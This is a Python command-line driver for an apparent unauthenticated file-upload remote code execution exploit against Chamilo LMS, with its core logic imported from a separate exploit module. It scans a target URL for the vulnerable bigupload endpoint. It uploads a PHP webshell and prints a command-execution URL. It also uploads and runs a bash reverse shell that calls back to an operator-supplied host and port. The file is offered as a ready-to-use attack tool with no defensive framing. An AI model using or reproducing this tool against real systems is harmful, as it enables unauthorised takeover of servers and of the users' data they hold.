from argparse import ArgumentParser
from exploit import ChamiloBigUploadExploit
from os import system


def check_extension(filename: str, extension: str) -> str:
    if not filename.endswith(f'.{extension}'):
        return f'{filename}.{extension}'
    return filename


def scan_action(exploit, url) -> None:
    system('clear')
    result = exploit.check_target_vulnerable()

    if result:
        print(' The target appears to be vulnerable. Proceed with caution. ')
    else:
        print(' The target is not vulnerable ')
        print(f'\nFailed to access {url}/main/inc/lib/javascript/bigupload/files/')


def webshell_action(exploit, url) -> None:
    system('clear')
    
    filename = input('Please provide the name for the webshell file to be uploaded to the target server (default: webshell.php): ')
    filename = filename or 'webshell.php'
    filename = check_extension(filename, 'php')

    result = exploit.send_webshell(filename)
    system('clear')

    if result:
        print(' Upload completed successfully ')
        print(f'\nWebshell URL: {result}?cmd=<command>')
    else:
        print(' An error occurred ')
        print(f'\nCould not confirm the file upload. Check at {url}/main/inc/lib/javascript/bigupload/files/')


def revshell_action(exploit) -> None:
    system('clear')

    webshell_filename = input('Please enter the name for the webshell file to be uploaded to the target server (default: webshell.php): ')
    bash_revshell_filename = input('Please enter the name for the bash reverse shell file to be uploaded to the target server (default: revshell.sh): ')
    host = input('Please provide the host address that the target server will connect to for the reverse shell: ')
    port = input('Please provide the port number on the host that the target server will connect to for the reverse shell: ')

    if not host or not port:
        print('\n A valid host and port must be provided ')
        exit(1)
    
    try:
        int(port)
    except ValueError:
        print('\n The port must be a valid number ')
        exit(1)

    webshell_filename = webshell_filename or 'webshell.php'
    bash_revshell_filename = bash_revshell_filename or 'revshell.sh'

    webshell_filename = check_extension(webshell_filename, 'php')
    bash_revshell_filename = check_extension(bash_revshell_filename, 'sh')

    system('clear')
    print(' Ensure you are listening on the specified port \n')

    result = exploit.send_and_execute_revshell(webshell_filename, bash_revshell_filename, host, port)

    if result:
        print(' Reverse shell executed successfully ')
        print('\nA reverse connection should have been established.')
    else:
        print(' Execution failed ')


def main():
    actions = {
        'scan': scan_action,
        'webshell': webshell_action,
        'revshell': revshell_action
    }

    parser = ArgumentParser(description="Chamilo LMS Unauthenticated Big Upload File RCE")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target Root Chamilo's URL")
    parser.add_argument('-a', '--action', type=str, required=True, choices=actions.keys(), help="Action to perform on the vulnerable endpoint (webshell: Create PHP webshell file, revshell: Create and execute bash revshell file)")

    args = parser.parse_args()
    action = args.action
    url = args.url.rstrip('/')

    exploit = ChamiloBigUploadExploit(url)

    actions[action](exploit, url)


if __name__ == "__main__":
    main()
